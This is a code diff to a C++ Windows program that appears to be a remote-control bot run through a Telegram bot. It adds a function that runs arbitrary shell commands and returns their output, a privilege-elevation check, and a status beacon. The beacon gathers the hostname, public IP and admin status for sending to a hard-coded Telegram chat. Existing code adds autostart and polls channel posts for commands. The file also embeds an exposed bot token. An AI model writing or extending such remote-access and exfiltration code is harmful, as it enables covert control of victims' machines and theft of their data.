@@ -7,6 +7,7 @@
 #include <vector>
 #include <atlimage.h>
 #include <winternl.h>
+#include <winsock.h>
 #include <nlohmann/json.hpp>
 #include <cpr/cpr.h>
 #pragma comment(lib, "Shlwapi.lib")
@@ -17,6 +18,7 @@ using json = nlohmann::json;
 string ID;
 const string botApi = "1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664"; //https://api.telegram.org/bot1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664/getUpdates
 const string chat_id = "-1001487776950";
+time_t uptime_start;
 
 inline bool filexits(const string& name) {
     struct stat buffer;
@@ -27,8 +29,16 @@ json GetLastMessage()
 {
     auto response = cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + botApi + "/getUpdates?last=1&offset=-1" });
     string s = response.text;
-    json j = json::parse(s.substr(21, s.size() - 23));
-    return j["channel_post"];
+    s = s.substr(21, s.size() - 23);
+    if (s.empty()) {
+        json jd;
+        jd["message_id"] = 69;
+        jd["date"] = -1;
+        return jd;
+    }
+    json j = json::parse(s);
+    j = j["channel_post"];
+    return j;
 }
 
 bool ChangeVolume(double nVolume, bool bScalar)
@@ -184,4 +194,69 @@ void autostart() {
     }
 }
 
+void Send(string to_send) {
+    cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + botApi + "/sendMessage?chat_id=" + chat_id + "&text=" + to_send});
+}
 
+string exec(const char* cmd) {
+    std::array<char, 128> buffer;
+    std::string result;
+    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
+    if (!pipe) {
+        throw std::runtime_error("popen() failed!");
+    }
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        result += buffer.data();
+    }
+    return result;
+}
+
+BOOL IsProcessElevated()
+{
+    BOOL fIsElevated = FALSE;
+    HANDLE hToken = NULL;
+    TOKEN_ELEVATION elevation;
+    DWORD dwSize;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+    {
+        printf("\n Failed to get Process Token :%d.", GetLastError());
+        goto Cleanup;  // if Failed, we treat as False
+    }
+
+
+    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
+    {
+        printf("\nFailed to get Token Information :%d.", GetLastError());
+        goto Cleanup;// if Failed, we treat as False
+    }
+
+    fIsElevated = elevation.TokenIsElevated;
+
+Cleanup:
+    if (hToken)
+    {
+        CloseHandle(hToken);
+        hToken = NULL;
+    }
+    return fIsElevated;
+}
+
+json getStatus() {
+    json status;
+
+    int uptime_h = (time(nullptr) - uptime_start)/CLOCKS_PER_SEC/3600;
+    int uptime_m = ((time(nullptr) - uptime_start) / CLOCKS_PER_SEC)/60;
+    uptime_m -= uptime_h * 60;
+    if (uptime_m < 0)uptime_m = 0;
+    
+    status["uptime"] = to_string(uptime_h) + "h" + to_string(uptime_m) + "m";
+    status["exe_name"] = get_exe();
+    string buffer = exec("hostname");
+    buffer[buffer.size() - 1] = ' ';
+    status["host_name"] = buffer;
+    auto response = cpr::Get(cpr::Url{ "https://myexternalip.com/raw" });
+    status["public_ip"] = response.text;
+    status["admin_rights"] = IsProcessElevated();
+    return status;
+}
